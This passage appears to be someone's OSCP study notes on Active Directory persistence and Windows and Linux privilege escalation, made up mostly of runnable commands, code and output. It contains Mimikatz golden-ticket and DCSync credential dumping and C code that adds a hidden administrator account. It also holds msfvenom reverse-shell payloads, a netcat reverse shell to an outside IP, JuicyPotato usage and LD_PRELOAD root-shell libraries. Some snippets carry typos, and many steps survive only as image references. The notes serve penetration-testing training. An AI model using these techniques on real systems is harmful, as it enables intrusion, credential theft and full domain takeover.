</span></strong>option instead of <strong><span style="color:#060f94;">/rc4 </span></strong>to indicate we are supplying the password hash. We will set the golden ticket&#39;s username to <strong><span style="color:#060f94;">fakeuser</span></strong>. This is allowed because the domain controller trusts anything correctly encrypted by the <strong><span style="color:#060f94;">krbtgt</span></strong> password hash.<br /><br /><strong><span style="color:#060f94;">mimikatz # kerberos::purge</span></strong><br />Ticket(s) purge for current session is OK<br /><br /><strong><span style="color:#060f94;">mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt</span></strong><br />User      : fakeuser<br />Domain    : corp.com (CORP)<br />SID       : S-1-5-21-1602875587-2787523311-2599479668<br />User Id   : 500<br />Groups Id : \*513 512 520 518 519<br />ServiceKey: 75b60230a2394a812000dbfad8415965 - rc4_hmac_nt<br />Lifetime  : 14/02/2018 15.08.48 ; 12/02/2028 15.08.48 ; 12/02/2028 15.08.48<br />-&gt; Ticket : \*\* Pass The Ticket \*\*<br /><br /> \* PAC generated<br /> \* PAC signed<br /> \* EncTicketPart generated<br /> \* EncTicketPart encrypted<br /> \* KrbCred generated<br /><br /><strong><span style="color:#060f94;">Golden ticket for &#39;fakeuser @ corp.com&#39; successfully submitted for current sessio</span></strong>n<br /><br /><span style="color:#060f94;">mimikatz # misc::cmd</span><br />Patch OK for &#39;cmd.exe&#39; from &#39;DisableCMD&#39; to &#39;KiwiAndCMD&#39; @ 012E3A24<br /><br /><br />With the golden ticket injected into memory, we can launch a new command prompt with misc::cmd and again attempt lateral movement with PsExec.<br /><br /><span style="color:#060f94;">C:\Users\offsec.corp&gt; psexec.exe \\dc01 cmd.exe</span><br /><br />PsExec v2.2 - Execute processes remotely<br />Copyright (C) 2001-2016 Mark Russinovich<br />Sysinternals - <a href="http://www.sysinternals.com">www.sysinternals.com</a><br /><br /><br /><span style="color:#060f94;">C:\Windows\system32&gt; ipconfig</span><br /><br />Windows IP Configuration<br /><br />Ethernet adapter Ethernet0:<br /><br />   Connection-specific DNS Suffix  . :<br />   Link-local IPv6 Address . . . . . : fe80::7959:aaad:eec:3969%2<br />   IPv4 Address. . . . . . . . . . . : 192.168.1.110<br />   Subnet Mask . . . . . . . . . . . : 255.255.255.0<br />   Default Gateway . . . . . . . . . : 192.168.1.1<br />...<br /><br /><span style="color:#060f94;">C:\Windows\system32&gt; whoami</span><br /><strong><span style="color:#f66151;">corp\fakeuser</span></strong><br /><br /><span style="color:#060f94;">C:\Windows\system32&gt; whoami /groups</span><br /><br />GROUP INFORMATION<br />-----------------<br /><br />Group Name                        Type             Attributes   <br />================================== ================ ==================================<br />Everyone                          Well-known group Mandatory group, Enabled by default<br />BUILTIN\Administrators            Alias            Mandatory group, Enabled by default<br />BUILTIN\Users                     Alias            Mandatory group, Enabled by default<br />...<br />NT AUTHORITY\Authenticated Users  Well-known group Mandatory group, Enabled by default<br />NT AUTHORITY\This Organization    Well-known group Mandatory group, Enabled by default<br /><strong><span style="color:#f66151;">CORP\Domain Admins</span></strong>                Group            Mandatory group, Enabled by default<br /><br /><strong><span style="color:#c061cb;">Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows.<br /></span></strong><br /><strong><span style="color:#060f94;">C:\Users\Offsec.corp&gt; psexec.exe \\192.168.1.110 cmd.exe</span></strong><br /><br />PsExec v2.2 - Execute processes remotely<br />Copyright (C) 2001-2016 Mark Russinovich<br />Sysinternals - <a href="http://www.sysinternals.com">www.sysinternals.com</a><br /><br />Couldn&#39;t access 192.168.1.110:<br /><strong><span style="color:#f66151;">Access is denied.</span></strong></div><div class='page'><h1 class='title level-3'>DC Sync</h1><br/><strong><h3>Domain Controller Synchronization</h3></strong><br />Another way to achieve persistence in an Active Directory infrastructure is to steal the password hashes for all administrative users in the domain.<br /><br />To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.<br /><br />While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.<br /><br />In production environments, domains typically have more than one domain controller to provide redundancy. The Directory Replication Service Remote Protocol2 uses replication3 to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, with the IDL_DRSGetNCChanges4 API.<br /><br />Luckily for us, the domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user who is a member of the Domain Admins group, it will succeed.<br /><br />In the next example, we will log in to the Windows 10 client as jeff_admin to simulate a compromise of a domain administrator account and perform a replication.<br /><br />We&#39;ll open Mimikatz and start the replication using <strong><span style="color:#060f94;">lsadump::dcsync </span></strong>with the <strong><span style="color:#060f94;">/user </span></strong>option to indicate the target user to sync, in this case the built-in domain administrator account Administrator, as shown in Listing 68.<br /><br /><strong><span style="color:#060f94;">mimikatz # lsadump::dcsync /user:Administrator</span></strong><br />[DC] &#39;corp.com&#39; will be the domain<br />[DC] &#39;DC01.corp.com&#39; will be the DC server<br />[DC] &#39;Administrator&#39; will be the user account<br /><br />Object RDN           : Administrator<br /><br />\*\* SAM ACCOUNT \*\*<br /><br />SAM Username         : Administrator<br />User Principal Name  : Administrator@corp.com<br />Account Type         : 30000000 ( USER_OBJECT )<br />User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )<br />Account expiration   :<br />Password last change : 05/02/2018 19.33.10<br />Object Security ID   : S-1-5-21-1602875587-2787523311-2599479668-500<br />Object Relative ID   : 500<br /><br />Credentials:<br /><span style="color:#060f94;">  Hash NTLM: e2b475c11da2a0748290d87aa966c327<br />  ntlm- 0: e2b475c11da2a0748290d87aa966c327<br />  lm  - 0: 913b84377b5cb6d210ca519826e7b5f5</span><br /><br />Supplemental Credentials:<br />\* Primary:NTLM-Strong-NTOWF \*<br />  Random Value : f62e88f00dff79bc79f8bad31b3ffa7d<br /><br />\* Primary:Kerberos-Newer-Keys \*<br />  Default Salt : CORP.COMAdministrator<br />  Default Iterations : 4096<br />  Credentials<br />  aes256_hmac (4096): 4c6300b908619dc7a0788da81ae5903c2c97c5160d0d9bed85cfd5af02dabf01<br />  aes128_hmac (4096): 85b66d5482fc19858dadd07f1d9b818a<br />  des_cbc_md5 (4096): 021c6df8bf07834a<br /><br />\* Primary:Kerberos \*<br />  Default Salt : CORP.COMAdministrator<br />  Credentials<br />    des_cbc_md5       : 021c6df8bf07834a<br /><br />\* Packages \*<br />  NTLM-Strong-NTOWF<br /><br />\* Primary:WDigest \*<br />  01  4ec8821bb09675db670e66998d2161bf<br />  02  3c9be2ff39c36efd2f84b63aa656d09a<br />  03  2cf1734936287692601b7e36fc01e2d7<br />  04  4ec8821bb09675db670e66998d2161bf<br />  05  3c9be2ff39c36efd2f84b63aa656d09a<br />...<br />Listing 68 - Dump password hashes for Administrator using DCSync<br /><br />The dump contains multiple hashes associated with the last twenty-nine used user passwords as well as the hashes used with AES encryption.<br /><br />Using the technique above, we can request a replication update with a domain controller and obtain the password hashes of every account in Active Directory without ever logging in to the domain controller.</div><div class='page'><h1 class='title level-1'>Windows PrivEsc</h1><br/><a href="https://fareedfauzi.gitbook.io/oscp-notes/windows-post-exploitation/windows-privesc-technique">https://fareedfauzi.gitbook.io/oscp-notes/windows-post-exploitation/windows-privesc-technique</a><br /><br /><br />Enum Services<br /><br />We can still take outservices that are started from the c:\windows folder toget a list of non-standard services. This can be done by pipingthe command we have so far into findstr again and usingthe /v flag to ignore anything that contains the string&quot;c:\windows&quot;.<br /><br /><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows&quot;</code></div><div class='page'><h1 class='title level-2'>UAC Bypass</h1><br/><a href="https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/privilege-escalation/windows-privilege-escalation-examples/user-account-control-uac-bypass-fodhelperexe-case-study">https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/privilege-escalation/windows-privilege-escalation-examples/user-account-control-uac-bypass-fodhelperexe-case-study</a><br /><br />In order to gather detailed information regarding the fodhelper integrity level and the permissions required to run this process, we will inspect its application manifest.4 The application manifest is an XML file containing information that lets the operating system know how to handle the program when it is started. We&#39;ll inspect the manifest with the sigcheck utility from Sysinternals,5 passing the -a argument to obtain extended information and -m to dump the manifest.<br /><br /><span style="color:#060f94;">C:\&gt; cd C:\Tools\privilege_escalation\SysinternalsSuite<br /><br />C:\Tools\privilege_escalation\SysinternalsSuite&gt; sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe</span><br /><br /><img src="images/136-1.png" alt="images/136-1.png" /><br /><br /><br /><img src="images/136-2.png" alt="images/136-2.png" /><br /><img src="images/136-3.png" alt="images/136-3.png" /><br /><img src="images/136-4.png" alt="images/136-4.png" /><br /><img src="images/136-5.png" alt="images/136-5.png" /><br /><span style="color:#060f94;">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command</span><br />The operation completed successfully.<br /><br />C:\Users\admin&gt;<br /><img src="images/136-6.png" alt="images/136-6.png" /><br /><span style="color:#060f94;">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ</span><br />The operation completed successfully.<br /><img src="images/136-7.png" alt="images/136-7.png" /><br /><span style="color:#060f94;">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d &quot;cmd.exe&quot; /f</span><br />The operation completed successfully.<br /><img src="images/136-8.png" alt="images/136-8.png" /><br /><span style="color:#060f94;">C:\Windows\system32&gt; net user admin Ev!lpass</span><br />The command completed successfully.</div><div class='page'><h1 class='title level-2'>Insecure File Permissions (Services)</h1><br/><strong><h2>Insecure File Permissions</h2></strong><br /><br /><span style="color:#060f94;">PS C:\Users\student&gt; Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like &#39;Running&#39;}</span><br /><br /><img src="images/137-1.png" alt="images/137-1.png" /><br /><br /><span style="color:#060f94;">C:\Users\student&gt; icacls &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br />C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)<br />                                                NT AUTHORITY\SYSTEM:(I)(F)<br />                                                BUILTIN\Administrators:(I)(F)<br />                                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)<br /><br />Successfully processed 1 files; Failed processing 0 files<br /><br /><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">#include &lt;stdlib.h&gt;</span><br /><br /><span style="color:#4a88f1;font-weight:400">int</span> main ()<br />{<br />  <span style="color:#4a88f1;font-weight:400">int</span> i;<br />  <br />  i = system (<span style="color:#5ebdab;font-weight:400">&quot;net user evil Ev!lpass /add&quot;</span>);<br />  i = system (<span style="color:#5ebdab;font-weight:400">&quot;net localgroup administrators evil /add&quot;</span>);<br />  <br />  <span style="color:#bf2e5e;font-weight:400">return</span> <span style="color:#9755b3;font-weight:400">0</span>;<br />}</pre></div><br /><img src="images/137-2.png" alt="images/137-2.png" /><br /><br /><span style="color:#060f94;">kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe</span><br /><br /><img src="images/137-3.png" alt="images/137-3.png" /><br /><span style="color:#060f94;">C:\Users\student&gt; move &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot; &quot;C:\Program Files\Serviio\bin\ServiioService_original.exe&quot;</span><br />        1 file(s) moved.<br /><br /><span style="color:#060f94;">C:\Users\student&gt; move adduser.exe &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br />        1 file(s) moved.<br /><br /><span style="color:#060f94;">C:\Users\student&gt; dir &quot;C:\Program Files\Serviio\bin\&quot;</span><br /> Volume in drive C has no label.<br /> Volume Serial Number is 56B9-BB74<br /><br /> Directory of C:\Program Files\Serviio\bin<br /><br />01/26/2018  07:21 AM    &lt;DIR&gt;          .<br />01/26/2018  07:21 AM    &lt;DIR&gt;          ..<br />12/04/2016  08:30 PM               867 serviio.bat<br />01/26/2018  07:19 AM            48,373 ServiioService.exe<br />12/04/2016  08:30 PM                10 ServiioService.exe.vmoptions<br />12/04/2016  08:30 PM           413,696 ServiioService_original.exe<br />               4 File(s)        462,946 bytes<br />               2 Dir(s)   3,826,667,520 bytes free<br />               <br />               <br />               <br /><span style="color:#060f94;">C:\Users\student&gt; net stop Serviio</span><br />System error 5 has occurred.<br /><br />Access is denied.<br /><br /><br /><span style="color:#060f94;">C:\Users\student&gt;wmic service where caption=&quot;Serviio&quot; get name, caption, state, startmode</span><br />Caption  Name     StartMode  State<br />Serviio  Serviio  <span style="color:#f66151;">Auto  </span>     Running<br /><br /><br /><img src="images/137-4.png" alt="images/137-4.png" /><br /><br /><span style="color:#060f94;">C:\Users\student&gt;whoami /priv<br /><br />C:\Users\student\Desktop&gt; shutdown /r /t 0 <br /><br />C:\Users\evil&gt; net localgroup Administrators</span><br /></div><div class='page'><h1 class='title level-2'>Leveraging Unquoted Service Paths</h1><br/><img src="images/138-1.png" alt="images/138-1.png" /><br /><br />Enum Services<br /><br />We can still take outservices that are started from the c:\windows folder toget a list of non-standard services. This can be done by pipingthe command we have so far into findstr again and usingthe /v flag to ignore anything that contains the string&quot;c:\windows&quot;.<br /><br /><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows&quot;</code></div><div class='page'><h1 class='title level-2'>Windows Kernel Vulnerabilities</h1><br/><strong><h2>Windows Kernel Vulnerabilities</h2></strong><br /><br /><span style="color:#060f94;">C:\&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;</span><br />OS Name:                   Microsoft Windows 7 Professional<br />OS Version:                6.1.7601 Service Pack 1 Build 7601<br />System Type:               X86-based PC<br /><br /><img src="images/139-1.png" alt="images/139-1.png" /><br /><br /><span style="color:#060f94;">C:\Users\student\Desktop&gt;driverquery /v</span><br /><br />Module Name  Display Name           Description            Driver Type   Start M<br />ode State      Status     Accept Stop Accept Pause Paged Pool Code(bytes BSS(by<br />Link Date              Path                                             Init(byt<br />es<br />============ ====================== ====================== ============= =======<br />=== ========== ========== =========== ============ ========== ========== ======<br />====================== ================================================ ========<br />==<br /><br />ACPI         Microsoft ACPI Driver  Microsoft ACPI Driver  Kernel        Boot<br />    Running    OK         TRUE        FALSE        77,824     143,360    0<br />11/20/2010 12:37:52 AM C:\Windows\system32\drivers\ACPI.sys             8,192<br /><br />...<br /><br /><span style="color:#f66151;">USBPcap      USBPcap Capture Servic USBPcap Capture Servic Kernel        Manual<br />    Stopped    OK         FALSE       FALSE        7,040      9,600      0<br />10/2/2015 2:08:15 AM   C:\Windows\system32\DRIVERS\USBPcap.sys          2,176</span><br /><br /><br /><img src="images/139-2.png" alt="images/139-2.png" /><br /><br /><span style="color:#060f94;">kali@kali:~# searchsploit USBPcap</span><br />--------------------------------------- ----------------------------------------<br /> Exploit Title                         |  Path<br />                                       | (/usr/share/exploitdb/)<br />--------------------------------------- ----------------------------------------<br /><span style="color:#f66151;">USBPcap 1.1.0.0 (WireShark 2.2.5) - Lo | exploits/windows/local/41542.c</span><br />--------------------------------------- ----------------------------------------<br /><br /><img src="images/139-3.png" alt="images/139-3.png" /><br /><br /><span style="color:#060f94;">C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1&gt; mingw-w64.bat</span><br /><br /><span style="color:#060f94;">C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1&gt;echo off</span><br />Microsoft Windows [Version 10.0.10240]<br />(c) 2015 Microsoft Corporation. All rights reserved.<br /><br /><span style="color:#060f94;">C:\&gt; gcc</span><br />gcc: fatal error: no input files<br />compilation terminated.<br /><br /><span style="color:#060f94;">C:\&gt; gcc --help</span><br /><br /><img src="images/139-4.png" alt="images/139-4.png" /><br /><img src="images/139-5.png" alt="images/139-5.png" /></div><div class='page'><h1 class='title level-2'>Service Exploits</h1><br/><img src="images/140-1.png" alt="images/140-1.png" /><br /><br /><img src="images/140-2.png" alt="images/140-2.png" /><br /><br /><img src="images/140-3.png" alt="images/140-3.png" /><br /><img src="images/140-4.png" alt="images/140-4.png" /><br /><br /><br /><strong><h3>Weak Registry</h3></strong><br /><img src="images/140-5.png" alt="images/140-5.png" /><br /><br /><img src="images/140-6.png" alt="images/140-6.png" /><br /><br /><strong><span style="color:#000000;">Change the service executable</span></strong><br /><img src="images/140-7.png" alt="images/140-7.png" /></div><div class='page'><h1 class='title level-2'>DLL Hijack</h1><br/><img src="images/141-1.png" alt="images/141-1.png" /><br /><br />You can copy the exe file on a machine with admin privileges to examine further. (Procmon is run as admin)<br /><br /><img src="images/141-2.png" alt="images/141-2.png" /><br /><br />Writable Directory<br /><img src="images/141-3.png" alt="images/141-3.png" /><br /><img src="images/141-4.png" alt="images/141-4.png" /><br /><br /><strong><span style="color:#060f94;">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=53 -f dll -o hijackme.dll</span></strong></div><div class='page'><h1 class='title level-2'>Registry Exploits</h1><br/>AutoRun Executable<br /><br /><img src="images/142-1.png" alt="images/142-1.png" /><br /><br /><strong><span style="color:#060f94;">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></strong><br /><br /><strong><span style="color:#060f94;">.\accesschk.exe /accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;</span></strong><br /><br />Change the file if you have write access, then restart the computer/service.<br /><br /><br /><strong><h3>AlwaysInstallElevated</h3></strong><br /><br /><img src="images/142-2.png" alt="images/142-2.png" /><br /><br /><img src="images/142-3.png" alt="images/142-3.png" /><br /><br />WinPEAS<br /><img src="images/142-4.png" alt="images/142-4.png" /><br /><br />Manual Check<br /><br /><img src="images/142-5.png" alt="images/142-5.png" /><br /><br /><strong><span style="color:#060f94;">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></strong><br /><br /><strong><span style="color:#060f94;">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></strong><br /><br /><img src="images/142-6.png" alt="images/142-6.png" /><br /><br /><strong><span style="color:#060f94;">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=53 -f msi -o elevate.msi</span></strong></div><div class='page'><h1 class='title level-2'>Passwords</h1><br/><img src="images/143-1.png" alt="images/143-1.png" /><br /><br /><strong><span style="color:#060f94;">reg query HKLM /f password /t REG_SZ /s</span></strong><br /><br /><strong><span style="color:#060f94;">reg query HKCU /f password /t REG_SZ /s</span></strong><br /><br />AutoLogon Credentials Query<br /><br /><img src="images/143-2.png" alt="images/143-2.png" /><br /><br /><strong><span style="color:#060f94;">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span></strong><br /><br />Putty Sessions<br /><img src="images/143-3.png" alt="images/143-3.png" /><br /><br />Spawn a Shell<br /><img src="images/143-4.png" alt="images/143-4.png" /></div><div class='page'><h1 class='title level-2'>Saved Credentials</h1><br/><img src="images/144-1.png" alt="images/144-1.png" /><br /><br /><strong><span style="color:#060f94;">C:/&gt; cmdkey /list</span></strong><br /><strong><span style="color:#060f94;">C:/&gt; runas /savecred /user:admin C:\PrivEsc\reverse.exe</span></strong><br /><img src="images/144-2.png" alt="images/144-2.png" /><br /><br /></div><div class='page'><h1 class='title level-2'>Configuration Files</h1><br/><img src="images/145-1.png" alt="images/145-1.png" /><br /><br /><img src="images/145-2.png" alt="images/145-2.png" /><br /><br /><strong><span style="color:#060f94;">dir /s *pass* == *.config<br /><br />findstr /si password *.xml *.ini *.txt</span></strong><br /><br /><br /><strong><h3>Unattend.xml</h3></strong><strong><br /></strong><br /><img src="images/145-3.png" alt="images/145-3.png" /><br /><br /><img src="images/145-4.png" alt="images/145-4.png" /><br /><br /><strong><span style="color:#060f94;">echo &quot;cGFzc3dvcmQxMjM=&quot; | base64 -d</span></strong><br />password123<br /><br /><strong><h3>SAM FILE BACKUPS</h3></strong><br /><br /><img src="images/145-5.png" alt="images/145-5.png" /><br /><br /><img src="images/145-6.png" alt="images/145-6.png" /><br /><br /><strong><span style="color:#ed333b;">Crack the Hash</span></strong><br /><img src="images/145-7.png" alt="images/145-7.png" /><br /><br /><strong><span style="color:#ed333b;">Pass the Hash</span></strong><br /><br /><img src="images/145-8.png" alt="images/145-8.png" /></div><div class='page'><h1 class='title level-2'>Scheduled Tasks</h1><br/><img src="images/146-1.png" alt="images/146-1.png" /><br /><br /><strong><span style="color:#060f94;">schtasks /query /fo LIST /v</span></strong><br /><br /><strong><span style="color:#060f94;">PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State</span></strong><br /><br /><img src="images/146-2.png" alt="images/146-2.png" /></div><div class='page'><h1 class='title level-2'>Insecure GUI Apps</h1><br/><img src="images/147-1.png" alt="images/147-1.png" /><br /><br /><strong><span style="color:#060f94;">tasklist /V | findstr mspaint.exe</span></strong><br /><br /><img src="images/147-2.png" alt="images/147-2.png" /><br /><br /><img src="images/147-3.png" alt="images/147-3.png" /><br /><br /><img src="images/147-4.png" alt="images/147-4.png" /></div><div class='page'><h1 class='title level-2'>Startup Apps</h1><br/><img src="images/148-1.png" alt="images/148-1.png" /><br /><img src="images/148-2.png" alt="images/148-2.png" /><br /><strong><span style="color:#060f94;">.\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</span></strong><br /><br /><strong><h3>Create a StartUp App</h3></strong><br /><br /><img src="images/148-3.png" alt="images/148-3.png" /><br /><br /><strong><span style="color:#f66151;">CreateShortcut.vbs</span></strong><span style="color:#060f94;"><br />Set oWS = WScript.CreatObject(&quot;WScript.Shell&quot;)<br />sLinkFike = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\escalate.lnk&quot;<br />Set oLink = oWS.CreateShortcut(sLinkFile)<br />oLink.TargetPath = &quot;C:\PrivEsc\reverse.exe&quot;<br />oLink.Save</span><br /><br /><span style="color:#060f94;">cscript CreateShortcut.vbs</span><br /><br /><strong><span style="color:#f66151;">HotPotato (Windows 7,8 and early Windows10)</span></strong><br /><img src="images/148-4.png" alt="images/148-4.png" /></div><div class='page'><h1 class='title level-2'>Token Impersonation</h1><br/><img src="images/149-1.png" alt="images/149-1.png" /><br /><img src="images/149-2.png" alt="images/149-2.png" /><br /><br /><img src="images/149-3.png" alt="images/149-3.png" /><br /><br /><strong><h3>Later Windows 10 Versions</h3></strong><br /><br /><img src="images/149-4.png" alt="images/149-4.png" /><br /><img src="images/149-5.png" alt="images/149-5.png" /><br /><br /><strong><h3>PrintSpoofer</h3></strong><br /><br /><img src="images/149-6.png" alt="images/149-6.png" /><br /><br /><br /><strong><h1>JuicyPotato (SeImpersonatePrivilege        Impersonate a client after authentication Enabled )</h1></strong><br /><br /><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a><br /><br />there is a list of CLSIDs ( { F087771F-D74F-4C1A-BB8A-E16ACA9124EA} )try until one works  <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br /><br />nc.exe -e cmd.exe 192.168.119.232 443 &gt; esc.bat <br />esc.bat<br /><br />juice.exe -l 1337 -p esc.bat -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}<br /><br />nc-nvlp 443<br /><br /><br /></div><div class='page'><h1 class='title level-2'>Enumeration Steps</h1><br/><img src="images/150-1.png" alt="images/150-1.png" /><br /><br /><img src="images/150-2.png" alt="images/150-2.png" /><br /><img src="images/150-3.png" alt="images/150-3.png" /><br /><img src="images/150-4.png" alt="images/150-4.png" /><br /><img src="images/150-5.png" alt="images/150-5.png" /><br /><br /><img src="images/150-6.png" alt="images/150-6.png" /></div><div class='page'><h1 class='title level-2'>User Privileges</h1><br/><img src="images/151-1.png" alt="images/151-1.png" /><br /><br /><img src="images/151-2.png" alt="images/151-2.png" /><br /><br /><img src="images/151-3.png" alt="images/151-3.png" /><br /><br /><img src="images/151-4.png" alt="images/151-4.png" /><br /><br /><img src="images/151-5.png" alt="images/151-5.png" /><br /><br /><img src="images/151-6.png" alt="images/151-6.png" /><br /><br /><img src="images/151-7.png" alt="images/151-7.png" /></div><div class='page'><h1 class='title level-1'>Linux PrivEsc</h1><br/></div><div class='page'><h1 class='title level-2'>Kernel Exploits</h1><br/><img src="images/159-1.png" alt="images/159-1.png" /><br /><br /><strong><span style="color:#060f94;">searchsploit linux kernel 2.6.32 priv esc</span></strong><br /><br /><strong><span style="color:#060f94;">searchsploit linux debian kernel 2.6 priv esc</span></strong><br /><br /><strong><span style="color:#060f94;">./linux-exploit-suggester-2.pl -k 2.6.32</span></strong></div><div class='page'><h1 class='title level-2'>Service Exploits</h1><br/><img src="images/160-1.png" alt="images/160-1.png" /><br /><br /><strong><span style="color:#060f94;">ps aux | grep &quot;^root&quot;</span></strong><br /><br /><img src="images/160-2.png" alt="images/160-2.png" /><br /><br /><img src="images/160-3.png" alt="images/160-3.png" /><br /><br />ssh -R &lt;local-port&gt;:127.0.0.1:&lt;service-port&gt; &lt;username&gt;@&lt;local-machine&gt;<br /><br /><strong><h2>Linux Smart Enum</h2></strong><br />https://github.com/diego-treitos/linux-smart-enumeration<br /><br />Level set 1 (-l) without imprompting for password(-i)<br /><br /><strong><span style="color:#060f94;">./lse.sh -l  1 -i</span></strong><br /><br />or<br /><br /><strong><span style="color:#060f94;">./lse.sh -i | more</span></strong><br /><br /></div><div class='page'><h1 class='title level-2'>Week File Permissions</h1><br/><img src="images/161-1.png" alt="images/161-1.png" /><br /><br /><img src="images/161-2.png" alt="images/161-2.png" /><br /><br /><img src="images/161-3.png" alt="images/161-3.png" /><br /><br /><strong><span style="color:#071ba3;">john --format=sha512crypt --wordlist=/usr/share/wordlist/rockyou.txt hash.txt</span></strong><br /><br /><strong><h3>If writable</h3></strong><br /><img src="images/161-4.png" alt="images/161-4.png" /><br /><br /><img src="images/161-5.png" alt="images/161-5.png" /><br /><br /><strong><span style="color:#071ba3;">mkpasswd -m sha-512 newpassword</span></strong><br /><br /><img src="images/161-6.png" alt="images/161-6.png" /><br /><br /><img src="images/161-7.png" alt="images/161-7.png" /><br /><br /><img src="images/161-8.png" alt="images/161-8.png" /></div><div class='page'><h1 class='title level-2'>Sudo</h1><br/><img src="images/162-1.png" alt="images/162-1.png" /><br /><br /><img src="images/162-2.png" alt="images/162-2.png" /><br /><br /><img src="images/162-3.png" alt="images/162-3.png" /><br /><br /><img src="images/162-4.png" alt="images/162-4.png" /><br /><br />E.G. Shell Escape<br /><br /><img src="images/162-5.png" alt="images/162-5.png" /><br /><br /><strong><span style="color:#071ba3;">sudo apache2 -f /etc/shadow</span></strong><br /><br /><img src="images/162-6.png" alt="images/162-6.png" /><br /><br /><img src="images/162-7.png" alt="images/162-7.png" /><br /><br /><img src="images/162-8.png" alt="images/162-8.png" /><br /><br /><img src="images/162-9.png" alt="images/162-9.png" /><br /><img src="images/162-10.png" alt="images/162-10.png" /><br /><img src="images/162-11.png" alt="images/162-11.png" /><br /><br /><strong><span style="color:#060f94;">vim preload.c</span></strong><br /><br /><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#bf2e5e;font-weight:400">#include &lt;sys/types.h&gt;</span><br /><span style="color:#bf2e5e;font-weight:400">#include &lt;stdlib.h&gt;</span><br /><br /><span style="color:#4a88f1;font-weight:400">void</span> _init() {<br />	unsetenv(<span style="color:#5ebdab;font-weight:400">&quot;LD_PRELOAD&quot;</span>);<br />	setresuid(<span style="color:#9755b3;font-weight:400">0</span>,<span style="color:#9755b3;font-weight:400">0</span>,<span style="color:#9755b3;font-weight:400">0</span>);<br />	system(<span style="color:#5ebdab;font-weight:400">&quot;/bin/bash -p&quot;</span>);<br />}</pre></div><br /><img src="images/162-12.png" alt="images/162-12.png" /><br /><br /><strong><span style="color:#060f94;">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c</span></strong><br /><br /><img src="images/162-13.png" alt="images/162-13.png" /><br /><br /><strong><span style="color:#060f94;">sudo LD_PRELOAD=/tmp/preload.so find</span></strong><br /><br /><br /><br /><img src="images/162-14.png" alt="images/162-14.png" /><br /><br /><img src="images/162-15.png" alt="images/162-15.png" /><br /><br /><img src="images/162-16.png" alt="images/162-16.png" /><br /><br /><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#bf2e5e;font-weight:400">#include &lt;stdlib.h&gt;</span><br /><br /><span style="color:#4a88f1;font-weight:400">static</span> <span style="color:#4a88f1;font-weight:400">void</span> hijack() __attribute__((constructor));<br /><br /><span style="color:#4a88f1;font-weight:400">void</span> hijack() {<br />	unsetenv(<span style="color:#5ebdab;font-weight:400">&quot;LD_LIBRARY_PATH&quot;</span>);<br />	setresuid(<span style="color:#9755b3;font-weight:400">0</span>,<span style="color:#9755b3;font-weight:400">0</span>,<span style="color:#9755b3;font-weight:400">0</span>);<br />	system(<span style="color:#5ebdab;font-weight:400">&quot;/bin/bash -p&quot;</span>);<br />}</pre></div><br /><img src="images/162-17.png" alt="images/162-17.png" /><br /><strong><span style="color:#060f94;">gcc 